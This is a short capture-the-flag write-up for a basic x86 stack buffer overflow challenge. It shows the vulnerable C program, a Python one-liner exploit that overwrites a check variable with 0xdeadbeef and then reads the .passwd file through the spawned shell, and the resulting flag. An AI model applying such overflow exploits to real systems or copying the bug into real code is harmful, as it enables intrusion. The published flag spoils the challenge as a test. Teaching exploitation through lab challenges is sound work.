<h1>ELF x86 - Stack buffer overflow basic 1</h1>
<h3>Description</h3>

```c
#include <unistd.h>
#include <sys/types.h>
#include <stdlib.h>
#include <stdio.h>
 
int main()
{
 
  int var;
  int check = 0x04030201;
  char buf[40];
 
  fgets(buf,45,stdin);
 
  printf("\n[buf]: %s\n", buf);
  printf("[check] %p\n", check);
 
  if ((check != 0x04030201) && (check != 0xdeadbeef))
    printf ("\nYou are on the right way!\n");
 
  if (check == 0xdeadbeef)
   {
     printf("Hell yeah! You win!\nOpening your shell...\n");
     setreuid(geteuid(), geteuid());
     system("/bin/bash");
     printf("Shell closed! Bye.\n");
   }
   return 0;
}
```

<h3>Solution</h3>
<label>Buffer overflow basic</label>

```console
app-systeme-ch13@challenge02:~$ (python -c "print('1'*40+'\xef\xbe\xad\xde')"; echo cat .passwd) | ./ch13

[buf]: 1111111111111111111111111111111111111111ﾭ�
[check] 0xdeadbeef
Hell yeah! You win!
Opening your shell...
1w4ntm0r3pr0np1s
Shell closed! Bye.
```
<h3>Flag</h3>
<pre>
1w4ntm0r3pr0np1s
</pre>
